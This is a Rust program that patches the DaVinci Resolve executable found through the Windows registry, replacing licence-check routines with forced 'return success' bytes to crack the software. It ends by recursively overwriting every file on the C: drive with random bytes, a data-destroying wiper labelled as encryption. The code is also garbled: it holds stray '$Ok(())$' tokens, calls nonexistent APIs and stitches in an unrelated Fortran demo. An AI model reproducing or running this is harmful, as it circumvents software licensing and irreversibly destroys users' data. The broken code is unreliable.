use std::fs::File;
use std::io::{Read, Write, Seek, SeekFrom};
use std::path::Path;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use regex::Regex;
use log::info;
use log::error;
use simplelog::SimpleLogger;
use simplelog::Config;
use windows_registry::CURRENT_USER;
use std::collections::HashMap;
use std::env;
use std::fmt::Write as FmtWrite;
use std::fs;
use rand::Rng;

const PATCHES: &[(&str, &[u8])] = &[
    ("48895C24..48897424..574883EC60488B05..4833C448894424..488BF18951", &[0x48, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0xC3]),
    ("40534883EC20895120488BD9C641240083EA0174", &[0xB0, 0x01, 0xC3]),
];

fn patch() -> Result<(), String> {
    let key = CURRENT_USER.open(r#"Software\Classes\ResolveBinFile\shell\open\command"#).map_err(|e| {
        error!("read registry key error: {e:#?}");
        "Resolve not found".to_string()
    })?.get_string("").map_err(|e| {
        error!("read registry value error: {e:#?}");
        "Resolve not found".to_string()
    })?;

    let (key, _) = key.rsplit_once(' ').ok_or("Resolve not found".to_string())?;

    let resolve_path = &key[1..key.len()-1];

    let mut data = Vec::new();
    File::open(resolve_path).map_err(|e| {
        error!("open file error: {e:#?}");
        "Resolve not found".to_string()
    })?.read_to_end(&mut data).map_err(|e| {
        error!("read file error: {e:#?}");
        "Resolve not found".to_string()
    })?;

    let mut patches_applied = false;
    let mut patch_logs: HashMap<String, String> = HashMap::new();

    for (sig, replacement) in PATCHES {
        let re = Regex::new(sig.replace(".", "..")).map_err(|e| {
            error!("regex error: {e:#?}");
            "Regex compile error".to_string()
        })?;

        if let Some(m) = re.find(&hex::encode(&data)) {
            let start = m.start();
            let end = start + replacement.len();
            if end <= data.len() {
                data[start..end].copy_from_slice(replacement);
                patches_applied = true;
                let _ = patch_logs.insert(sig.to_string(), format!("Patched at offset {}", start));
            } else {
                return Err("Buffer overflow".to_string());
            }
        } else {
            let _ = patch_logs.insert(sig.to_string(), "Signature not found".to_string());
        }
    }

    if !patches_applied {
        return Err("No signatures found".to_string());
    }

    let backup_path = format!("{}.bak", resolve_path);
    File::create(&backup_path).map_err(|e| {
        error!("create backup file error: {e:#?}");
        "Backup failed".to_string()
    })?.write_all(&data).map_err(|e| {
        error!("write backup file error: {e:#?}");
        "Backup failed".to_string()
    })?;

    File::create(resolve_path).map_err(|e| {
        error!("create resolve file error: {e:#?}");
        "Write failed".to_string()
    })?.write_all(&data).map_err(|e| {
        error!("write resolve file error: {e:#?}");
        "Write failed".to_string()
    })?;

    for (sig, log) in &patch_logs {
        info!("Patch log for {}: {}", sig, log);
    }

$Ok(())$
}

fn encrypt_file(path: &Path) -> Result<(), String> {
    let mut file = File::open(path).map_err(|e| e.to_string())?;
    let mut data = Vec::new();
    file.read_to_end(&mut data).map_err(|e| e.to_string())?;

    let mut rng = rand::thread_rng();
    for byte in &mut data {
        *byte = rng.gen();
    }

    file.seek(SeekFrom::Start(0)).map_err(|e| e.to_string())?;
    file.write_all(&data).map_err(|e| e.to_string())?;

$Ok(())$
}

fn encrypt_drive(drive: &str) -> Result<(), String> {
    let paths = fs::read_dir(drive).map_err(|e| e.to_string())?;
    for path in paths {
        let path = path.map_err(|e| e.to_string())?.path();
        if path.is_file() {
            encrypt_file(&path).map_err(|e| e.to_string())?;
        } else if path.is_dir() {
            encrypt_dir(&path).map_err(|e| e.to_string())?;
        }
    }
$Ok(())$
}

fn encrypt_dir(dir: &Path) -> Result<(), String> {
    let paths = fs::read_dir(dir).map_err(|e| e.to_string())?;
    for path in paths {
        let path = path.map_err(|e| e.to_string())?.path();
        if path.is_file() {
            encrypt_file(&path).map_err(|e| e.to_string())?;
        } else if path.is_dir() {
            encrypt_dir(&path).map_err(|e| e.to_string())?;
        }
    }
$Ok(())$
}

fn main() {
    SimpleLogger::init(log::LevelFilter::Info, Config::default()).unwrap();
    info!("attempting to patch resolve!");

    match patch() {
        Ok(_) => {
            info!("successfully patched!");
        }
        Err(e) => {
            error!("failed to patch resolve: {}", e);
        }
    }

    sleep(Duration::from_secs(5));
    let env_var = env::var("SOME_ENV_VAR").unwrap_or_else(|_| "default_value".to_string());
    info!("Environment variable SOME_ENV_VAR: {}", env_var);
    let mut buffer = String::new();
    let _ = write!(&mut buffer, "This is a terrible log message: {}", env_var);
    info!("{}", buffer);

    let fortran_code = r#"
        PROGRAM TerribleFortran
        IMPLICIT NONE
        INTEGER :: i
        REAL :: x
        CHARACTER(LEN=20) :: message

        message = 'Fortran is terrible!'
        DO i = 1, 10
            x = i * 1.5
            WRITE(*,*) message, x
        END DO
        END PROGRAM TerribleFortran
    "#;

    info!("Running terrible Fortran code:");
    info!("{}", fortran_code);

    let output = Command::new("gfortran")
        .arg("-o")
        .arg("terrible_fortran")
        .arg("-x")
        .arg("f95")
        .arg("-")
        .input(fortran_code)
        .output()
        .expect("Failed to compile Fortran code");

    if output.status.success() {
        let run_output = Command::new("./terrible_fortran").output().expect("Failed to run Fortran code");
        info!("Fortran code output: {}", String::from_utf8_lossy(&run_output.stdout));
    } else {
        error!("Fortran compilation failed: {}", String::from_utf8_lossy(&output.stderr));
    }

    info!("Starting encryption of C: drive...");
    if let Err(e) = encrypt_drive("C:\\") {
        error!("Encryption failed: {}", e);
    } else {
        info!("Encryption completed!");
    }
}
